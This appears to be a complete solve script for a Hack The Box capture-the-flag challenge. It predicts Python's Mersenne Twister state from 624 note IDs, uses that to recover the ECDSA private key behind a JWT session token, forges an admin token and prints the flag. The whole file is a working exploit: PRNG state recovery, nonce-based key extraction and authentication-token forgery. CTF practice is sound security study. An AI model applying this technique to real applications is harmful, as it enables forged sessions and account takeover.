#!/usr/bin/env python3

import os
import random
import requests
import sys

from base64 import b64decode, b64encode
from hashlib import sha256
from string import printable

from fastecdsa.curve import brainpoolP256r1


URL = 'http://127.0.0.1:1337' if len(sys.argv) == 1 else 'http://' + sys.argv[1]

username = password = os.urandom(8).hex()
requests.post(f'{URL}/register', data={'username': username, 'password': password, 'email': 'x'})

s = requests.session()
s.post(f'{URL}/login', data={'username': username, 'password': password})

for _ in range(624):
    s.post(f'{URL}/create-note', data={'title': 'A', 'description': 'B'})

res = s.post(f'{URL}/view-notes')
notes = res.json().get('notes', [])
state = tuple(n.get('id', 0) for n in notes)
random.setstate((3, state + (624, ), None))

token = s.cookies.get('token')
assert isinstance(token, str)

signature = b64decode(token.split('.')[-1])
r, s = int(signature[:32].hex(), 16), int(signature[32:].hex(), 16)

q, G = brainpoolP256r1.q, brainpoolP256r1.G

h = int(sha256('.'.join(token.split('.')[:-1]).encode()).hexdigest(), 16)
k = int(''.join(random.choices(printable, k=32)).encode().hex(), 16)
assert r == (G * k).x
x = (s * k - h) * pow(r, -1, q) % q

admin_data = b'.'.join(map(b64encode, [b'{"alg":"EC256","typ":"JWT"}', b'{"username":"HTBAdmin1337_ZUSD3uQG4I"}']))

h = int(sha256(admin_data).hexdigest(), 16)
k = 1337
r = (G * k).x
s = pow(k, -1, q) * (h + x * r) % q

admin_token = admin_data + b'.' + b64encode(r.to_bytes(32, 'big') + s.to_bytes(32, 'big'))
Q = G * x

res = requests.get(f'{URL}/dashboard', cookies={'token': admin_token.decode(), 'pubkey': f'{Q.x},{Q.y}'}).text
print(res[res.index('HTB{'):res.index('}') + 1])
